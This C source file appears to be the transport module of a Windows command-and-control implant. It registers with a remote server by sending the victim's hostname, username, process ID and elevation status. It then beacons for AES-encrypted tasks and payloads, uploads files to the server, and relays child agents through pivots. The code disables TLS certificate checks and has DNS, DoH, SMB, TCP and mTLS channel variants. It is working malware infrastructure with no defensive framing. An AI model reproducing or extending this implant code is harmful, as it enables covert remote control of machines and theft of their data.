#include "transport.h"
#include "config.h"
#include "crypto.h"
#include "b64.h"
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#define SECURITY_WIN32
#include <secext.h>
#include "api_resolve.h"
#include "transport_dns.h"
#include "transport_doh.h"
#include "transport_smb.h"
#include "transport_tcp.h"

AgentState g_agent = {0};

int agent_transport_needs_registration(void) {
    return strcmp(AGENT_TRANSPORT, "tcp") == 0 && !g_agent.has_key;
}

// ── mTLS client certificate ───────────────────────────────────────────────────

#ifndef AGENT_PFX
#define AGENT_PFX ""
#endif

static PCCERT_CONTEXT g_mtls_cert = NULL;
static LONG g_mtls_cert_init = 0;

static void load_mtls_cert(void) {
    const char *pfx_b64 = AGENT_PFX;
    if (!pfx_b64[0]) return;
    size_t dec_len = 0;
    uint8_t *pfx = b64_decode(pfx_b64, &dec_len);
    if (!pfx) return;
    CRYPT_DATA_BLOB blob = {(DWORD)dec_len, pfx};
    HCERTSTORE hStore = PFXImportCertStore(&blob, L"", CRYPT_EXPORTABLE);
    free(pfx);
    if (!hStore) return;
    PCCERT_CONTEXT ctx = CertFindCertificateInStore(hStore,
        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_ANY, NULL, NULL);
    CertCloseStore(hStore, 0);
    g_mtls_cert = ctx;
}

static CRITICAL_SECTION g_transport_lock;
static LONG g_transport_lock_init = 0;

static void transport_lock(void) {
    /* State: 0=uninit, 1=initialising, 2=ready */
    if (InterlockedCompareExchange(&g_transport_lock_init, 1, 0) == 0) {
        InitializeCriticalSection(&g_transport_lock);
        InterlockedExchange(&g_transport_lock_init, 2);
    } else {
        while (InterlockedOr(&g_transport_lock_init, 0) < 2)
            Sleep(0);
    }
    EnterCriticalSection(&g_transport_lock);
}
static void transport_unlock(void) { LeaveCriticalSection(&g_transport_lock); }

// TLS ignore flags (self-signed server cert)
#define SEC_IGNORE_FLAGS \
    (SECURITY_FLAG_IGNORE_UNKNOWN_CA | \
     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | \
     SECURITY_FLAG_IGNORE_CERT_CN_INVALID  | \
     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)

// ── Wide-string helper ────────────────────────────────────────────────────────

static wchar_t* to_wide(const char *s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w = (wchar_t*)malloc(n * sizeof(wchar_t));
    if (w) MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

// ── URL parser ────────────────────────────────────────────────────────────────

typedef struct { int is_https; char host[256]; INTERNET_PORT port; char base[512]; } ParsedURL;

static ParsedURL parse_url(const char *url) {
    ParsedURL r = {0};
    const char *rest;
    if (strncmp(url, "https://", 8) == 0) { r.is_https = 1; rest = url + 8; r.port = 443; }
    else if (strncmp(url, "http://", 7) == 0) { rest = url + 7; r.port = 80; }
    else { rest = url; r.port = 80; }

    const char *slash = strchr(rest, '/');
    char host_port[256] = {0};
    if (slash) {
        size_t hp_len = (size_t)(slash - rest);
        if (hp_len >= sizeof(host_port)) hp_len = sizeof(host_port) - 1;
        memcpy(host_port, rest, hp_len);
        host_port[hp_len] = '\0';
        strncpy(r.base, slash, sizeof(r.base) - 1);
    } else {
        strncpy(host_port, rest, sizeof(host_port) - 1);
    }
    char *colon = strrchr(host_port, ':');
    if (colon) { *colon = '\0'; r.port = (INTERNET_PORT)atoi(colon + 1); }
    /* Strip IPv6 brackets: "[::1]" → "::1" */
    if (host_port[0] == '[') {
        size_t hl = strlen(host_port);
        if (hl > 2 && host_port[hl - 1] == ']') {
            memmove(host_port, host_port + 1, hl - 2);
            host_port[hl - 2] = '\0';
        }
    }
    strncpy(r.host, host_port, sizeof(r.host) - 1);
    return r;
}

// ── Core HTTP function ────────────────────────────────────────────────────────

// Returns 1 on success. Allocates *resp_out (caller must free). Sets *resp_len, *status.
static int http_do(const char *method, const char *path,
                   const uint8_t *body, size_t body_len,
                   uint8_t **resp_out, size_t *resp_len, int *status) {
    *resp_out = NULL; *resp_len = 0; *status = 0;

    ParsedURL p = parse_url(AGENT_SERVER_URL);
    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s%s", p.base, path);

    wchar_t *w_ua   = to_wide(AGENT_USER_AGENT);
    wchar_t *w_host = to_wide(p.host);
    wchar_t *w_verb = to_wide(method);
    wchar_t *w_path = to_wide(full_path);
    int ok = 0;

    HINTERNET hSess = WinHttpOpen(w_ua, WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto cleanup;

    if (p.is_https) {
        DWORD protos = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
        WinHttpSetOption(hSess, WINHTTP_OPTION_SECURE_PROTOCOLS, &protos, sizeof(protos));
    }

    HINTERNET hConn = WinHttpConnect(hSess, w_host, p.port, 0);
    if (!hConn) goto cleanup_sess;

    DWORD flags = p.is_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, w_verb, w_path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) goto cleanup_conn;

    if (p.is_https) {
        DWORD sec = SEC_IGNORE_FLAGS;
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
        if (strcmp(AGENT_TRANSPORT, "mtls") == 0 && g_mtls_cert) {
            WinHttpSetOption(hReq, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
                (LPVOID)g_mtls_cert, sizeof(*g_mtls_cert));
        }
    }

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0))
        goto cleanup_req;

    if (!WinHttpReceiveResponse(hReq, NULL)) goto cleanup_req;

    DWORD code = 0, code_sz = sizeof(code);
    WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &code, &code_sz, WINHTTP_NO_HEADER_INDEX);
    *status = (int)code;

    // Read response body into dynamic buffer
    size_t cap = 8192, len = 0;
    uint8_t *buf = (uint8_t*)malloc(cap);
    if (!buf) goto cleanup_req;
    DWORD got;
    while (WinHttpReadData(hReq, buf + len, (DWORD)(cap - len), &got) && got > 0) {
        len += got;
        if (len + 8192 > cap) {
            cap *= 2;
            uint8_t *nb = (uint8_t*)realloc(buf, cap);
            if (!nb) { free(buf); goto cleanup_req; }
            buf = nb;
        }
    }
    /* Null-terminate so callers can safely use strstr/json helpers. */
    {
        uint8_t *nb = (uint8_t*)realloc(buf, len + 1);
        if (!nb) { free(buf); goto cleanup_req; }
        buf = nb;
    }
    buf[len] = '\0';
    *resp_out = buf;
    *resp_len = len;
    ok = 1;

cleanup_req:  WinHttpCloseHandle(hReq);
cleanup_conn: WinHttpCloseHandle(hConn);
cleanup_sess: WinHttpCloseHandle(hSess);
cleanup:
    free(w_ua); free(w_host); free(w_verb); free(w_path);
    return ok;
}

// Public helper used by pivot modules. Injects an extra header (e.g. "X-C2-Parent: id\r\n").
int agent_http_do(const char *method, const char *path,
                  const uint8_t *body, size_t body_len,
                  const char *extra_hdr,
                  uint8_t **resp_out, size_t *resp_len, int *status) {
    *resp_out = NULL; *resp_len = 0; *status = 0;
    ParsedURL p = parse_url(AGENT_SERVER_URL);
    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s%s", p.base, path);
    wchar_t *w_ua   = to_wide(AGENT_USER_AGENT);
    wchar_t *w_host = to_wide(p.host);
    wchar_t *w_verb = to_wide(method);
    wchar_t *w_path = to_wide(full_path);
    int ok = 0;
    HINTERNET hSess = WinHttpOpen(w_ua, WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto pub_cleanup;
    HINTERNET hConn = WinHttpConnect(hSess, w_host, p.port, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); goto pub_cleanup; }
    DWORD flags = p.is_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, w_verb, w_path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); goto pub_cleanup; }
    if (p.is_https) {
        DWORD sec = SEC_IGNORE_FLAGS;
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
        /* Pivot relays use agent_http_do rather than the normal transport
         * request path.  Preserve the embedded client certificate when a C
         * agent running over mTLS starts an SMB/HTTP child relay. */
        if (strcmp(AGENT_TRANSPORT, "mtls") == 0 && g_mtls_cert) {
            WinHttpSetOption(hReq, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
                (LPVOID)g_mtls_cert, sizeof(*g_mtls_cert));
        }
    }
    if (extra_hdr && extra_hdr[0]) {
        wchar_t *w_hdr = to_wide(extra_hdr);
        WinHttpAddRequestHeaders(hReq, w_hdr, (DWORD)wcslen(w_hdr), WINHTTP_ADDREQ_FLAG_ADD);
        free(w_hdr);
    }
    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0))
        { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); goto pub_cleanup; }
    if (!WinHttpReceiveResponse(hReq, NULL))
        { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); goto pub_cleanup; }
    DWORD code = 0, code_sz = sizeof(code);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &code, &code_sz, WINHTTP_NO_HEADER_INDEX);
    *status = (int)code;
    size_t cap = 8192, len = 0;
    uint8_t *buf = (uint8_t*)malloc(cap);
    if (buf) {
        DWORD got;
        while (WinHttpReadData(hReq, buf + len, (DWORD)(cap - len), &got) && got > 0) {
            len += got;
            if (len + 8192 > cap) {
                cap *= 2;
                uint8_t *nb = (uint8_t*)realloc(buf, cap);
                if (!nb) { free(buf); buf = NULL; break; }
                buf = nb;
            }
        }
        if (buf) { *resp_out = buf; *resp_len = len; ok = 1; }
    }
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
pub_cleanup:
    free(w_ua); free(w_host); free(w_verb); free(w_path);
    return ok;
}

// ── JSON helpers ──────────────────────────────────────────────────────────────

static int json_hex_digit(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/* Decode a JSON string value starting immediately after its opening quote.
 * The previous parser only skipped the escape slash, turning "\\n" into the
 * literal character 'n' (and Windows CRLF into "rn"). */
static size_t json_decode_string(const char *start, char *out, size_t out_sz) {
    const char *p = start;
    size_t n = 0;
    while (*p && *p != '"') {
        unsigned char ch = (unsigned char)*p++;
        if (ch == '\\' && *p) {
            ch = (unsigned char)*p++;
            switch (ch) {
            case '"': case '\\': case '/': break;
            case 'b': ch = '\b'; break;
            case 'f': ch = '\f'; break;
            case 'n': ch = '\n'; break;
            case 'r': ch = '\r'; break;
            case 't': ch = '\t'; break;
            case 'u': {
                int h0 = json_hex_digit(p[0]), h1 = json_hex_digit(p[1]);
                int h2 = json_hex_digit(p[2]), h3 = json_hex_digit(p[3]);
                if (h0 >= 0 && h1 >= 0 && h2 >= 0 && h3 >= 0) {
                    unsigned cp = (unsigned)((h0 << 12) | (h1 << 8) |
                                             (h2 << 4) | h3);
                    p += 4;
                    ch = cp < 0x80 ? (unsigned char)cp : '?';
                } else {
                    ch = 'u';
                }
                break;
            }
            default: break; /* preserve unknown escapes as their byte */
            }
        }
        if (out && out_sz > 1 && n < out_sz - 1) out[n] = (char)ch;
        n++;
    }
    if (out && out_sz) out[n < out_sz ? n : out_sz - 1] = '\0';
    return n;
}

// Extract a JSON string value. Returns 1 on success.
static int json_str(const char *json, const char *key, char *out, size_t out_sz) {
    if (!json || !key || !out || out_sz == 0) return 0;
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    while (*p == ':' || *p == ' ') p++;
    if (*p != '"') return 0;
    json_decode_string(p + 1, out, out_sz);
    return 1;
}

// Allocate and return a JSON string value. Caller must free().
static char* json_str_alloc(const char *json, const char *key) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return NULL;
    p += strlen(needle);
    while (*p == ':' || *p == ' ') p++;
    if (*p != '"') return NULL;
    p++;
    const char *start = p;
    // The raw length is a safe upper bound for the decoded value.
    while (*p && *p != '"') { if (*p == '\\' && p[1]) p++; p++; }
    size_t len = (size_t)(p - start);
    char *out = (char*)malloc(len + 1);
    if (!out) return NULL;
    json_decode_string(start, out, len + 1);
    return out;
}

// Extract a JSON integer value.
static long long json_int(const char *json, const char *key) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return -1;
    p += strlen(needle);
    while (*p == ':' || *p == ' ') p++;
    return strtoll(p, NULL, 10);
}

// Find the next JSON object `{...}` starting at or after `p`.
// Returns pointer to '{', sets *end to '}'. Returns NULL if none.
static const char* next_obj(const char *p, const char **end) {
    while (*p && *p != '{') p++;
    if (!*p) return NULL;
    int depth = 0;
    const char *start = p;
    while (*p) {
        if (*p == '"') { p++; while (*p && *p != '"') { if (*p == '\\') p++; if (*p) p++; } }
        else if (*p == '{') depth++;
        else if (*p == '}') { depth--; if (depth == 0) { *end = p; return start; } }
        if (*p) p++;
    }
    return NULL;
}

// ── Agent protocol ────────────────────────────────────────────────────────────

static int is_elevated(void) {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return 0;
    DWORD elev = 0, sz = sizeof(DWORD);
    BOOL ok = GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &sz);
    if (ok && elev) { CloseHandle(token); return 1; }
    /* Check linked token: UAC-limited local admin runs at MEDIUM but has a
       linked HIGH-integrity token.  Detecting it gives the orange icon. */
    HANDLE linked = NULL; sz = sizeof(linked);
    if (GetTokenInformation(token, TokenLinkedToken, &linked, sizeof(linked), &sz) && linked) {
        DWORD elev2 = 0; sz = sizeof(DWORD);
        BOOL ok2 = GetTokenInformation(linked, TokenElevation, &elev2, sizeof(elev2), &sz);
        CloseHandle(linked);
        if (ok2 && elev2) { CloseHandle(token); return 1; }
    }
    CloseHandle(token);
    return 0;
}

int agent_register(void) {
    // Load mTLS client cert once on first registration attempt.
    if (strcmp(AGENT_TRANSPORT, "mtls") == 0) {
        if (InterlockedCompareExchange(&g_mtls_cert_init, 1, 0) == 0)
            load_mtls_cert();
    }

    // Transport dispatch
    if (strcmp(AGENT_TRANSPORT, "dns") == 0) return transport_dns_register();
    if (strcmp(AGENT_TRANSPORT, "doh") == 0) return transport_doh_register();
    if (strcmp(AGENT_TRANSPORT, "smb") == 0) return transport_smb_register();
    if (strcmp(AGENT_TRANSPORT, "tcp") == 0) return transport_tcp_register();

    char exe_name[MAX_PATH] = "agent.exe";
#ifdef AGENT_BUILD_NAME
    strncpy(exe_name, AGENT_BUILD_NAME, sizeof(exe_name) - 1);
#else
    if (GetModuleFileNameA(NULL, exe_name, sizeof(exe_name)) > 0) {
        char *slash = strrchr(exe_name, '\\');
        if (slash) memmove(exe_name, slash + 1, strlen(slash + 1) + 1);
    } else {
        /* Fallback: parse executable name from command-line (first token) */
        const char *cl = GetCommandLineA();
        if (cl) {
            char tmp[MAX_PATH] = {0};
            if (*cl == '"') {
                cl++;
                size_t i = 0;
                while (*cl && *cl != '"' && i < sizeof(tmp)-1) tmp[i++] = *cl++;
            } else {
                size_t i = 0;
                while (*cl && *cl != ' ' && i < sizeof(tmp)-1) tmp[i++] = *cl++;
            }
            char *slash = strrchr(tmp, '\\');
            const char *base = slash ? slash + 1 : tmp;
            if (*base) strncpy(exe_name, base, sizeof(exe_name) - 1);
        }
    }
#endif

    char hostname[128] = "UNKNOWN", username[256] = "UNKNOWN";
    DWORD h_sz = sizeof(hostname);
    GetComputerNameA(hostname, &h_sz);
    for (DWORD i = 0; i < h_sz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
    ULONG u_sz = sizeof(username);
    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &u_sz))
        GetUserNameA(username, (DWORD*)&u_sz);
    /* Escape backslashes (DOMAIN\user) for JSON */
    char username_j[512] = {0};
    for (int _i = 0, _j = 0; username[_i] && _j < (int)sizeof(username_j) - 2; _i++) {
        if (username[_i] == '\\') username_j[_j++] = '\\';
        username_j[_j++] = username[_i];
    }

    char body[1024];
    snprintf(body, sizeof(body),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
        "\"pid\":%lu,\"transport\":\"%s\","
        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
        hostname, username_j, (unsigned long)GetCurrentProcessId(),
        AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
        is_elevated() ? "true" : "false", AGENT_PARENT_ID);

    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    if (!http_do("POST", "/register",
                 (const uint8_t*)body, strlen(body),
                 &resp, &resp_len, &status) || status != 200 || !resp)
    { free(resp); return 0; }

    char agent_id[64] = {0}, aes_key_b64[128] = {0};
    char *text = (char*)resp;
    json_str(text, "agent_id", agent_id, sizeof(agent_id));
    json_str(text, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
    free(resp);

    if (!agent_id[0] || !aes_key_b64[0]) return 0;

    size_t key_len = 0;
    uint8_t *key = b64_decode(aes_key_b64, &key_len);
    if (!key || key_len < 32) { free(key); return 0; }

    strncpy(g_agent.agent_id, agent_id, sizeof(g_agent.agent_id) - 1);
    memcpy(g_agent.aes_key, key, 32);
    g_agent.has_key = 1;
    free(key);
    return 1;
}

AgentTask* agent_beacon(int *count) {
    *count = 0;
    // Transport dispatch
    if (strcmp(AGENT_TRANSPORT, "dns") == 0) return transport_dns_beacon(count);
    if (strcmp(AGENT_TRANSPORT, "doh") == 0) return transport_doh_beacon(count);
    if (strcmp(AGENT_TRANSPORT, "smb") == 0) return transport_smb_beacon(count);
    if (strcmp(AGENT_TRANSPORT, "tcp") == 0) return transport_tcp_beacon(count);

    if (!g_agent.has_key) return NULL;

    char path[256];
    snprintf(path, sizeof(path), "/beacon/%s", g_agent.agent_id);

    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    transport_lock();
    int http_ok = http_do("GET", path, NULL, 0, &resp, &resp_len, &status);
    transport_unlock();
    if (!http_ok || status == 204 || status != 200 || !resp)
    { free(resp); return NULL; }

    // Decrypt
    size_t plain_len = 0;
    uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, resp, resp_len, &plain_len);
    free(resp);
    if (!plain) return NULL;

    // Parse tasks array
    const char *tasks_start = strstr((char*)plain, "\"tasks\"");
    if (!tasks_start) { free(plain); return NULL; }
    tasks_start = strchr(tasks_start, '[');
    if (!tasks_start) { free(plain); return NULL; }
    tasks_start++;
    while (*tasks_start == ' ' || *tasks_start == '\t' ||
           *tasks_start == '\r' || *tasks_start == '\n') tasks_start++;
    if (*tasks_start == ']') { free(plain); return NULL; }

    // Count tasks
    int cap = 16;
    AgentTask *tasks = (AgentTask*)calloc(cap, sizeof(AgentTask));
    if (!tasks) { free(plain); return NULL; }

    const char *p = tasks_start;
    const char *obj_end;
    while ((p = next_obj(p, &obj_end)) != NULL) {
        // Make null-terminated copy of this task object
        size_t obj_len = obj_end - p + 1;
        char *obj = (char*)malloc(obj_len + 1);
        if (!obj) break;
        memcpy(obj, p, obj_len);
        obj[obj_len] = '\0';

        if (*count >= cap) {
            cap *= 2;
            AgentTask *nt = (AgentTask*)realloc(tasks, cap * sizeof(AgentTask));
            if (!nt) { free(obj); break; }
            tasks = nt;
        }

        AgentTask *t = &tasks[*count];
        t->id = json_int(obj, "id");
        json_str(obj, "type", t->type, sizeof(t->type));
        t->args    = json_str_alloc(obj, "args");
        t->payload = NULL; t->payload_len = 0;

        char *pl_b64 = json_str_alloc(obj, "payload");
        if (pl_b64 && pl_b64[0]) {
            t->payload = b64_decode(pl_b64, &t->payload_len);
        }
        free(pl_b64);
        free(obj);

        (*count)++;
        p = obj_end + 1;
        // Stop at end of tasks array
        if (*p == ']') break;
    }

    free(plain);
    return tasks;
}

void tasks_free(AgentTask *tasks, int count) {
    if (!tasks) return;
    for (int i = 0; i < count; i++) {
        free(tasks[i].args);
        free(tasks[i].payload);
    }
    free(tasks);
}

static void send_enc(const char *path, const char *json_body) {
    if (!g_agent.has_key) return;
    size_t enc_len = 0;
    uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32,
        (const uint8_t*)json_body, strlen(json_body), &enc_len);
    if (!enc) return;
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    http_do("POST", path, enc, enc_len, &resp, &resp_len, &status);
    free(resp); free(enc);
}

// Escape a string for embedding in a JSON value (replaces \ and " with \\ and \")
static char* json_escape(const char *s) {
    if (!s) return strdup("");
    size_t len = strlen(s);
    char *out = (char*)malloc(len * 2 + 1);
    if (!out) return NULL;
    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        if (s[i] == '"')       { out[j++] = '\\'; out[j++] = '"'; }
        else if (s[i] == '\\') { out[j++] = '\\'; out[j++] = '\\'; }
        else if (s[i] == '\n') { out[j++] = '\\'; out[j++] = 'n'; }
        else if (s[i] == '\r') { out[j++] = '\\'; out[j++] = 'r'; }
        else if (s[i] == '\t') { out[j++] = '\\'; out[j++] = 't'; }
        else out[j++] = s[i];
    }
    out[j] = '\0';
    return out;
}

void agent_send_result_admin(long long task_id, const char *output,
                              const char *error, int is_admin) {
    // Transport dispatch
    if (strcmp(AGENT_TRANSPORT, "dns") == 0) {
        transport_dns_send_result(task_id, output, error); return;
    }
    if (strcmp(AGENT_TRANSPORT, "doh") == 0) {
        transport_doh_send_result(task_id, output, error, is_admin); return;
    }
    if (strcmp(AGENT_TRANSPORT, "smb") == 0) {
        transport_smb_send_result(task_id, output, error, is_admin); return;
    }
    if (strcmp(AGENT_TRANSPORT, "tcp") == 0) {
        transport_tcp_send_result(task_id, output, error, is_admin); return;
    }
    char *esc_out = json_escape(output ? output : "");
    char *esc_err = json_escape(error  ? error  : "");
    size_t json_sz = strlen(esc_out) + strlen(esc_err) + 128;
    char *body = (char*)malloc(json_sz);
    if (body) {
        snprintf(body, json_sz,
            "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
            task_id, esc_out, esc_err, is_admin ? "true" : "false");
        char path[128];
        snprintf(path, sizeof(path), "/result/%s", g_agent.agent_id);
        transport_lock();
        send_enc(path, body);
        transport_unlock();
        free(body);
    }
    free(esc_out); free(esc_err);
}

void agent_send_result(long long task_id, const char *output, const char *error) {
    agent_send_result_admin(task_id, output, error, 0);
}

void agent_upload_file(long long task_id, const char *filename,
                       const uint8_t *data, size_t data_len) {
    if (!g_agent.has_key) return;
    if (strcmp(AGENT_TRANSPORT, "tcp") == 0) {
        transport_tcp_upload_file(task_id, filename, data, data_len);
        return;
    }
    (void)task_id;
    size_t enc_len = 0;
    uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32, data, data_len, &enc_len);
    if (!enc) return;
    char path[256];
    snprintf(path, sizeof(path), "/upload/%s/%s", g_agent.agent_id, filename);
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    transport_lock();
    http_do("POST", path, enc, enc_len, &resp, &resp_len, &status);
    transport_unlock();
    free(resp); free(enc);
}

uint8_t* agent_download_file(const char *filename, size_t *out_len) {
    *out_len = 0;
    if (!g_agent.has_key) return NULL;
    if (strcmp(AGENT_TRANSPORT, "tcp") == 0)
        return transport_tcp_download_file(filename, out_len);
    char path[256];
    snprintf(path, sizeof(path), "/dl/%s/%s", g_agent.agent_id, filename);
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    if (!http_do("GET", path, NULL, 0, &resp, &resp_len, &status) ||
        status != 200 || !resp)
    { free(resp); return NULL; }
    uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, resp, resp_len, out_len);
    free(resp);
    return plain;
}

// ── Public JSON helpers (for transport modules) ───────────────────────────────

int agent_json_str(const char *json, const char *key, char *out, size_t out_sz) {
    return json_str(json, key, out, out_sz);
}
char* agent_json_str_alloc(const char *json, const char *key) {
    return json_str_alloc(json, key);
}
long long agent_json_int(const char *json, const char *key) {
    return json_int(json, key);
}
const char* agent_json_next_obj(const char *p, const char **end) {
    return next_obj(p, end);
}

// Parse decrypted tasks JSON {"tasks":[...]} into an AgentTask array.
AgentTask* agent_parse_tasks(const uint8_t *plain, size_t plain_len, int *count) {
    *count = 0;
    (void)plain_len;
    const char *tasks_start = strstr((const char*)plain, "\"tasks\"");
    if (!tasks_start) return NULL;
    tasks_start = strchr(tasks_start, '[');
    if (!tasks_start) return NULL;
    tasks_start++;
    /* Skip whitespace; if we're immediately at ']', the tasks array is empty. */
    while (*tasks_start == ' ' || *tasks_start == '\t' ||
           *tasks_start == '\r' || *tasks_start == '\n') tasks_start++;
    if (*tasks_start == ']') return NULL;

    int cap = 16;
    AgentTask *tasks = (AgentTask*)calloc(cap, sizeof(AgentTask));
    if (!tasks) return NULL;

    const char *p = tasks_start;
    const char *obj_end;
    while ((p = next_obj(p, &obj_end)) != NULL) {
        size_t obj_len = obj_end - p + 1;
        char *obj = (char*)malloc(obj_len + 1);
        if (!obj) break;
        memcpy(obj, p, obj_len); obj[obj_len] = '\0';

        if (*count >= cap) {
            cap *= 2;
            AgentTask *nt = (AgentTask*)realloc(tasks, cap * sizeof(AgentTask));
            if (!nt) { free(obj); break; }
            tasks = nt;
        }
        AgentTask *t = &tasks[*count];
        t->id = json_int(obj, "id");
        json_str(obj, "type", t->type, sizeof(t->type));
        t->args = json_str_alloc(obj, "args");
        t->payload = NULL; t->payload_len = 0;
        char *pl_b64 = json_str_alloc(obj, "payload");
        if (pl_b64 && pl_b64[0]) t->payload = b64_decode(pl_b64, &t->payload_len);
        free(pl_b64); free(obj);
        (*count)++;
        p = obj_end + 1;
        if (*p == ']') break;
    }
    return tasks;
}

// HTTP-only registration — used by DoH which delegates registration to HTTP.
int agent_http_register(void) {
    char exe_name[MAX_PATH] = "agent.exe";
#ifdef AGENT_BUILD_NAME
    strncpy(exe_name, AGENT_BUILD_NAME, sizeof(exe_name) - 1);
#else
    if (GetModuleFileNameA(NULL, exe_name, sizeof(exe_name)) > 0) {
        char *sl = strrchr(exe_name, '\\');
        if (sl) memmove(exe_name, sl + 1, strlen(sl + 1) + 1);
    }
#endif
    char hostname[128] = "UNKNOWN", username[256] = "UNKNOWN";
    DWORD h_sz2 = sizeof(hostname);
    GetComputerNameA(hostname, &h_sz2);
    for (DWORD i = 0; i < h_sz2; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
    ULONG u_sz2 = sizeof(username);
    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &u_sz2))
        GetUserNameA(username, (DWORD*)&u_sz2);
    char username_j2[512] = {0};
    for (int _i = 0, _j = 0; username[_i] && _j < (int)sizeof(username_j2) - 2; _i++) {
        if (username[_i] == '\\') username_j2[_j++] = '\\';
        username_j2[_j++] = username[_i];
    }
    char body[1024];
    snprintf(body, sizeof(body),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
        "\"pid\":%lu,\"transport\":\"%s\","
        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
        hostname, username_j2, (unsigned long)GetCurrentProcessId(),
        AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
        is_elevated() ? "true" : "false", AGENT_PARENT_ID);
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    if (!http_do("POST", "/register", (const uint8_t*)body, strlen(body),
                 &resp, &resp_len, &status) || status != 200 || !resp)
    { free(resp); return 0; }
    char agent_id[64] = {0}, aes_key_b64[128] = {0};
    json_str((char*)resp, "agent_id", agent_id, sizeof(agent_id));
    json_str((char*)resp, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
    free(resp);
    if (!agent_id[0] || !aes_key_b64[0]) return 0;
    size_t key_len = 0;
    uint8_t *key = b64_decode(aes_key_b64, &key_len);
    if (!key || key_len < 32) { free(key); return 0; }
    strncpy(g_agent.agent_id, agent_id, sizeof(g_agent.agent_id) - 1);
    memcpy(g_agent.aes_key, key, 32);
    g_agent.has_key = 1;
    free(key);
    return 1;
}
